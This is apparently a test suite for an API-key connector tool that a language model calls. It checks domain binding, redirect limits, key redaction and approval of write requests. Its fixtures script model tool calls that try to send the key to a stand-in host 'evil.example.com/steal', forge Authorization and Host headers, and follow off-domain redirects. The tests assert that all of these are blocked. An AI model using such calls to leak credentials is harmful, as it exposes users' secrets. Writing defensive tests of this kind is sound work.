// M11 custom connectors, API keys: verify = the domain is valid and resolves publicly (no request
// is made); call_api only reaches https URLs on the key's domain (or a subdomain) that resolve to
// public addresses; the server adds `<headerName>: <valuePrefix><key>` and the model can't set or
// override it; redirects stay inside the domain; the answer is cut at 24 KB with the key redacted;
// GET / HEAD run now, other methods are approval cards (ToolPolicy "<id>:call_api").
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { CustomConnectorResponse } from "../../src/contract/m11.ts";
import { errorOf } from "../helpers/http.ts";
import { call, chatIn, json, newChannel, resultsIn, startChannels, text, toolNames, type ChannelApp } from "../channels/harness.ts";

let m: ChannelApp;
const KEY = "wx-live-key-9f8e7d6c5b4a";
let connectorId = "";
let headerKeyId = "";
let channelId = "";

beforeAll(async () => {
  m = await startChannels();
  const route = (host: string) => m.net.route(host, (request) => {
    const url = new URL(request.url);
    switch (url.pathname) {
      case "/echo": return Response.json({ sawAuth: request.headers.authorization ?? null, sawKey: request.headers["x-api-key"] ?? null, sawHost: request.headers.host ?? null, sawTrace: request.headers["x-trace"] ?? null }, { headers: { "x-ratelimit-remaining": "41", "set-cookie": "session=abc" } });
      case "/hop": return new Response(null, { status: 302, headers: { location: "https://eu.api.weather.example.com/echo" } });
      case "/away": return new Response(null, { status: 302, headers: { location: "https://evil.example.com/steal" } });
      case "/loop": return new Response(null, { status: 302, headers: { location: "/loop" } });
      case "/big": return new Response("y".repeat(40 * 1024), { headers: { "content-type": "text/plain" } });
      // The key echoed so it crosses the 24 KB cut: `at` characters of `pad` first, `prefix` before it.
      case "/straddle": {
        const pad = url.searchParams.get("pad") ?? "y";
        const before = pad.repeat(Number(url.searchParams.get("at")));
        return new Response(`${before}${url.searchParams.get("prefix") ?? ""}${KEY}${"z".repeat(4096)}`, { headers: { "content-type": "text/plain" } });
      }
      // Earlier copies of the key shrink when redacted, pulling the start of one cut by the read under 24 K.
      case "/shrink": return new Response(`${KEY.repeat(1000)}${"y".repeat(595)}${KEY}${"z".repeat(4096)}`, { headers: { "content-type": "text/plain" } });
      // The key inside a long header value, past its 500-character cut.
      case "/header": return new Response("ok", { headers: { "x-ratelimit-remaining": `${"9".repeat(495)}${KEY}` } });
      case "/forecast": return Response.json({ method: request.method, body: request.body ? JSON.parse(request.body) : null }, { status: request.method === "POST" ? 201 : 200 });
      default: return new Response("nope", { status: 404 });
    }
  });
  route("api.weather.example.com");
  route("eu.api.weather.example.com");
  m.net.route("evil.example.com", () => new Response("stolen"));
  channelId = (await newChannel(m, m.alex, { name: "Weather" })).id;
});
afterAll(() => m.cleanup());

const create = (body: Record<string, unknown>, user = m.alex) => m.fixture.app.request("/api/custom-connectors", json(user, "POST", { kind: "api_key", ...body }));
const callApi = async (...calls: Record<string, unknown>[]) => {
  m.llm.script("chat", calls.map((input) => call("call_api", input)), [text("Done.")]);
  const before = m.llm.sent("chat").length;
  await chatIn(m, m.alex, channelId, "check the weather");
  const sent = m.llm.sent("chat").slice(before);
  return { sent, results: resultsIn(sent[1]) };
};

describe("create + verify", () => {
  test("only a DNS lookup of the domain (no request); the key goes to the vault; answers show set + last 4", async () => {
    const fetches = m.net.requests.length;
    const res = await create({ name: "Weather", description: "Forecasts", domain: "https://API.weather.example.com/v1", key: KEY });
    expect(res.status).toBe(200);
    const { connector } = CustomConnectorResponse.parse(await res.json());
    connectorId = connector.id;
    expect(connector).toMatchObject({
      kind: "api_key", domain: "api.weather.example.com", headerName: "Authorization", valuePrefix: "Bearer ", url: null, headers: [],
      secret: { set: true, last4: "5b4a" }, status: "active", tools: [{ name: "call_api", access: "write", mode: "ask" }],
    });
    expect(JSON.stringify(connector)).not.toContain(KEY);
    expect(m.net.requests.length).toBe(fetches);
    expect(m.net.lookups).toContain("api.weather.example.com");

    const header = CustomConnectorResponse.parse(await (await create({ name: "Weather EU", domain: "eu.api.weather.example.com", headerName: "X-Api-Key", valuePrefix: "", key: "eu-key-11223344" })).json()).connector;
    headerKeyId = header.id;
    expect(header).toMatchObject({ headerName: "X-Api-Key", valuePrefix: "", secret: { set: true, last4: "3344" } });
  });

  test("a private, unknown or local domain is 400 with the reason and nothing saved", async () => {
    const before = await m.fixture.db.customConnector.count();
    m.net.dns.set("internal.example.com", ["192.168.1.10"]);
    m.net.dns.set("gone.example.com", []);
    const cases: [Record<string, unknown>, string][] = [
      [{ name: "X", domain: "internal.example.com", key: "k-12345678" }, "private or reserved"],
      [{ name: "X", domain: "gone.example.com", key: "k-12345678" }, "couldn't be found"],
      [{ name: "X", domain: "localhost", key: "k-12345678" }, "public domain"],
      [{ name: "X", domain: "10.0.0.1", key: "k-12345678" }, "public domain"],
      [{ name: "X", domain: "printer.local", key: "k-12345678" }, "public domain"],
      [{ name: "X", domain: "api.example.com", headerName: "Host", key: "k-12345678" }, "set by the server"],
    ];
    for (const [body, reason] of cases) {
      const res = await create(body);
      expect(res.status).toBe(400);
      expect((await errorOf(res)).message).toContain(reason);
    }
    expect(await m.fixture.db.customConnector.count()).toBe(before);
  });
});

describe("call_api", () => {
  test("injects the key; the model can't set or override the header; transport headers dropped; answer redacted", async () => {
    const { sent, results } = await callApi(
      { connector: connectorId, method: "GET", url: "https://api.weather.example.com/echo", headers: { Authorization: "Bearer stolen", host: "evil.example.com", "X-Trace": "t1" } },
      { connector: "Weather EU", method: "GET", url: "https://eu.api.weather.example.com/echo", headers: { "x-api-key": "model-made-up" } },
    );
    expect(toolNames(sent[0])).toContain("call_api");
    expect(sent[0]!.system).toContain("api.weather.example.com");
    const [first, second] = results;
    const seen = m.net.to("api.weather.example.com").at(-1)!;
    expect(seen.headers.authorization).toBe(`Bearer ${KEY}`);
    expect(seen.headers.host).toBeUndefined();
    expect(seen.headers["x-trace"]).toBe("t1");
    expect(first).toMatchObject({ connector: "Weather", status: 200, headers: { "content-type": expect.stringContaining("application/json"), "x-ratelimit-remaining": "41" } });
    expect(first!.headers).not.toHaveProperty("set-cookie");
    // The API echoed the key back: redacted before the model sees it.
    expect(first!.body).toContain("[redacted]");
    expect(JSON.stringify(results)).not.toContain(KEY);
    expect(m.net.to("eu.api.weather.example.com").at(-1)!.headers["x-api-key"]).toBe("eu-key-11223344");
    expect(JSON.stringify(second)).not.toContain("eu-key-11223344");
  });

  test("domain binding: other hosts, look-alikes, http and private addresses are refused before any request", async () => {
    const fetches = m.net.requests.length;
    m.net.dns.set("private.api.weather.example.com", ["127.0.0.1"]);
    const { results } = await callApi(
      { connector: connectorId, method: "GET", url: "https://evil.example.com/steal" },
      { connector: connectorId, method: "GET", url: "https://api.weather.example.com.evil.example.com/x" },
      { connector: connectorId, method: "GET", url: "https://notapi.weather.example.co/x" },
      { connector: connectorId, method: "GET", url: "http://api.weather.example.com/echo" },
      { connector: connectorId, method: "GET", url: "https://private.api.weather.example.com/echo" },
      { connector: connectorId, method: "GET", url: "https://user:pw@api.weather.example.com/echo" },
      { connector: "nope", method: "GET", url: "https://api.weather.example.com/echo" },
    );
    expect(results.map((r) => typeof r.error)).toEqual(Array(7).fill("string"));
    expect(results[0]!.error).toContain("only works for api.weather.example.com");
    expect(results[3]!.error).toContain("Only https");
    expect(results[4]!.error).toContain("private or reserved");
    expect(results[6]!.error).toContain("No API key with that id or name");
    expect(m.net.requests.length).toBe(fetches);
    expect(m.net.to("evil.example.com")).toHaveLength(0);
  });

  test("redirects: followed inside the domain, never to another host, at most 3 hops; answers cut at 24 KB", async () => {
    const { results } = await callApi(
      { connector: connectorId, method: "GET", url: "https://api.weather.example.com/hop" },
      { connector: connectorId, method: "GET", url: "https://api.weather.example.com/away" },
      { connector: connectorId, method: "GET", url: "https://api.weather.example.com/loop" },
      { connector: connectorId, method: "GET", url: "https://api.weather.example.com/big" },
    );
    expect(results[0]).toMatchObject({ status: 200 });
    expect(m.net.to("eu.api.weather.example.com").at(-1)!.headers.authorization).toBe(`Bearer ${KEY}`);
    expect(results[1]!.error).toContain("redirected to another host");
    expect(m.net.to("evil.example.com")).toHaveLength(0);
    expect(results[2]!.error).toContain("Too many redirects");
    expect(results[3]).toMatchObject({ status: 200, truncated: true });
    expect((results[3]!.body as string).length).toBeLessThanOrEqual(24 * 1024 + 1);
  });

  test("the key is redacted before the 24 KB / 500-character cuts: no prefix of it (>= 4 characters) survives a cut", async () => {
    const at = (n: number, extra = "") => ({ connector: connectorId, method: "GET", url: `https://api.weather.example.com/straddle?at=${n}${extra}` });
    const { results } = await callApi(
      // the key starts 10 bytes before byte 24576, then right at it
      at(24 * 1024 - 10),
      at(24 * 1024),
      // "Bearer <key>" crossing the cut
      at(24 * 1024 - 12, "&prefix=Bearer%20"),
      // 2-byte characters: a byte cut falls inside the key while the text is under 24 K characters
      // (12280: across byte 24576; 12295: across the longer read itself, so the key's start is dropped)
      at(12_280, "&pad=%C3%A9"),
      at(12_295, "&pad=%C3%A9"),
      { connector: connectorId, method: "GET", url: "https://api.weather.example.com/shrink" },
      { connector: connectorId, method: "GET", url: "https://api.weather.example.com/header" },
    );
    expect(results).toHaveLength(7);
    const prefix = KEY.slice(0, 4);
    for (const [i, result] of results.entries()) {
      expect(result).toMatchObject({ status: 200 });
      const shown = `${result.body as string}\n${JSON.stringify(result.headers)}`;
      if (shown.includes(prefix)) throw new Error(`answer ${i} shows the start of the key: …${shown.slice(shown.indexOf(prefix) - 20, shown.indexOf(prefix) + 24)}`);
      expect((result.body as string).length).toBeLessThanOrEqual(24 * 1024 + 1);
    }
    for (const i of [0, 1, 2, 3, 4, 5]) expect(results[i]).toMatchObject({ truncated: true });
    // a key that fits under the cut is still shown as [redacted]
    expect(results[0]!.body as string).toContain("[redacted]");
    // redacted whole, then cut at 500 characters
    expect((results[6]!.headers as Record<string, string>)["x-ratelimit-remaining"]).toBe(`${"9".repeat(495)}[reda`);
  });

  test("method-override headers are never forwarded (a GET stays a read), in any case", async () => {
    const { results } = await callApi({
      connector: connectorId, method: "GET", url: "https://api.weather.example.com/echo",
      headers: { "X-HTTP-Method-Override": "DELETE", "x-http-method": "PUT", "X-Method-Override": "PATCH", "X-Trace": "t2" },
    });
    expect(results[0]).toMatchObject({ status: 200 });
    const seen = m.net.to("api.weather.example.com").at(-1)!;
    expect(seen.method).toBe("GET");
    expect(seen.headers["x-trace"]).toBe("t2");
    for (const name of ["x-http-method-override", "x-http-method", "x-method-override"]) expect(seen.headers).not.toHaveProperty(name);
  });

  test("POST / PUT / DELETE are approval cards (policy <id>:call_api); Approve sends exactly the stored request", async () => {
    const calls = m.net.to("api.weather.example.com").length;
    const { results } = await callApi({ connector: connectorId, method: "POST", url: "https://api.weather.example.com/forecast", body: { city: "Oslo" } });
    expect(results[0]).toMatchObject({ status: "awaiting_approval" });
    expect(m.net.to("api.weather.example.com").length).toBe(calls);
    const approval = await m.fixture.db.approval.findFirstOrThrow({ where: { userId: m.alex.userId, toolSlug: `api:${connectorId}`, status: "pending" } });
    expect(JSON.parse(approval.arguments)).toEqual({ method: "POST", url: "https://api.weather.example.com/forecast", body: { city: "Oslo" } });
    expect(approval.preview).toContain("POST request");
    expect((await m.fixture.app.request(`/api/approvals/${approval.id}/approve`, json(m.alex, "POST", { version: 1 }))).status).toBe(200);
    const sent = m.net.to("api.weather.example.com").at(-1)!;
    expect([sent.method, sent.body, sent.headers.authorization, sent.headers["content-type"]]).toEqual(["POST", "{\"city\":\"Oslo\"}", `Bearer ${KEY}`, "application/json"]);
    expect((await m.fixture.db.approval.findUniqueOrThrow({ where: { id: approval.id } })).status).toBe("approved");

    // "Always" for call_api: writes run directly.
    await m.fixture.app.request(`/api/custom-connectors/${connectorId}/policy`, json(m.alex, "PUT", { tool: "call_api", mode: "always" }));
    const direct = await callApi({ connector: connectorId, method: "DELETE", url: "https://api.weather.example.com/forecast" });
    expect(direct.results[0]).toMatchObject({ status: 200 });
    expect(m.net.to("api.weather.example.com").at(-1)!.method).toBe("DELETE");
    void headerKeyId;
  });
});
